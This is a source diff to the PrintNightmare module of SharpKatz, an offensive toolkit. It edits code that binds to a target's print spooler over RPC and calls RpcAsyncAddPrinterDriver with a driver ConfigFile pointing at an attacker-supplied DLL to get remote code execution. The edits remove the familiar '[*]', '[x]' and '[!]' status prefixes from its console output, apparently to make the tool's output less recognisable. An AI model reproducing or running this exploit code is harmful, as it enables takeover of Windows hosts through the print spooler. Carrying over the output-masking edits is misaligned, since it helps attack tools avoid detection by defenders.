@@ -90,7 +90,7 @@ namespace SharpKatz.Module
 
         public static bool RunPrintNightmare(string target, string exploit_path, string authuser, string authdomain, string authpassword, int auth = DCSync.RPC_C_AUTHN_GSS_NEGOTIATE, string altservice = "host")
         {
-            Console.WriteLine("[*] ");
+            Console.WriteLine("    ");
 
             rpcConn = DCSync.CreateBinding(target, altservice, auth, authuser, authdomain, authpassword, impersonationType: DCSync.RPC_C_IMP_LEVEL_DELEGATE);
 
@@ -104,7 +104,7 @@ namespace SharpKatz.Module
 
             if (rpcStatus != NTSTATUS.Success)
             {
-                Console.WriteLine("[x] Error RpcEpResolveBinding {0}", (int)rpcStatus);
+                Console.WriteLine("    Error RpcEpResolveBinding {0}", (int)rpcStatus);
 
                 return false;
             }
@@ -113,14 +113,14 @@ namespace SharpKatz.Module
 
             if (rpcStatus != NTSTATUS.Success)
             {
-                Console.WriteLine("[x] Error RpcBindingSetOption {0}", (int)rpcStatus);
+                Console.WriteLine("    Error RpcBindingSetOption {0}", (int)rpcStatus);
 
                 return false;
             }
 
             string driverpath = FindDriverPath(rpcConn);
             driverpath += "\\unidrv.dll";
-            Console.WriteLine("[*] DriverPath: {0}", driverpath);
+            Console.WriteLine("    DriverPath: {0}", driverpath);
 
             string environment = "Windows x64";
             DRIVER_INFO_2 dvi2 = new DRIVER_INFO_2
@@ -172,7 +172,7 @@ namespace SharpKatz.Module
                 dwFlags |= 0x00000004;// APD_COPY_ALL_FILES
             }
             dvi2.pConfigFile = sConfig;
-            Console.WriteLine("[!] ConfigFile: {0}", dvi2.pConfigFile);
+            Console.WriteLine("    ConfigFile: {0}", dvi2.pConfigFile);
 
             IntPtr pDvi2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DRIVER_INFO_2)));
             Marshal.StructureToPtr(dvi2, pDvi2, false);
@@ -182,12 +182,12 @@ namespace SharpKatz.Module
             NTSTATUS ret = (NTSTATUS)RpcAsyncAddPrinterDriver(GetStubPtr(), GetProcStringPtr(116),hBinding, null, pContainer, dwFlags);
             if (ret == NTSTATUS.Success)
             {
-                Console.WriteLine("[*] OK!");
+                Console.WriteLine("    OK!");
                 return true;
             }
             else
             {
-                Console.WriteLine("[x] KO! " + ret);
+                Console.WriteLine("    KO! " + ret);
             }
             return false;
         }
@@ -224,12 +224,12 @@ namespace SharpKatz.Module
                 }
                 else
                 {
-                    Console.WriteLine("[x] failed RpcEnumPrinterDrivers 2 : " + status);
+                    Console.WriteLine("    failed RpcEnumPrinterDrivers 2 : " + status);
                 }
             }
             else
             {
-                Console.WriteLine("[x] failed RpcEnumPrinterDrivers 1 : " + status);
+                Console.WriteLine("    failed RpcEnumPrinterDrivers 1 : " + status);
             }
             return "";
         }
